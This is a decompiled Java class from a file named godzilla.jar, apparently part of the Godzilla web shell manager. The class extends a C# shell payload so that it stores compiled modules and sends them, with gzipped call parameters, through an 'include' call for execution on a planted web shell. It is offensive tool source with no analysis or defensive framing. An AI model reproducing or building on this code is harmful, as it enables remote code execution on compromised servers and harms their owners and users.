/*    */ package shells.payloads.csharp;
/*    */ 
/*    */ import java.util.HashMap;
/*    */ import util.functions;
/*    */ import util.http.ReqParameter;
/*    */ 
/*    */ 
/*    */ public class CShapShellEx
/*    */   extends CShapShell
/*    */ {
/* 11 */   private final HashMap<String, byte[]> moduleMap = (HashMap)new HashMap<>();
/*    */ 
/*    */   
/*    */   public boolean include(String codeName, byte[] binCode) {
/* 15 */     this.moduleMap.put(codeName, binCode);
/* 16 */     return true;
/*    */   }
/*    */ 
/*    */   
/*    */   public byte[] evalFunc(String className, String funcName, ReqParameter parameter) {
/* 21 */     if (className != null && className.trim().length() > 0) {
/* 22 */       if (this.moduleMap.get(className) != null) {
/* 23 */         ReqParameter evalNextData = new ReqParameter();
/* 24 */         evalNextData.add("codeName", className);
/* 25 */         evalNextData.add("binCode", this.moduleMap.get(className));
/*    */         
/* 27 */         parameter.add("evalClassName", className);
/* 28 */         parameter.add("methodName", funcName);
/*    */         
/* 30 */         evalNextData.add("evalNextData", functions.gzipE(parameter.formatEx()));
/*    */         
/* 32 */         return super.evalFunc(null, "include", evalNextData);
/*    */       } 
/*    */       
/* 35 */       return "no include".getBytes();
/*    */     } 
/*    */     
/* 38 */     return super.evalFunc(className, funcName, parameter);
/*    */   }
/*    */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\payloads\csharp\CShapShellEx.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */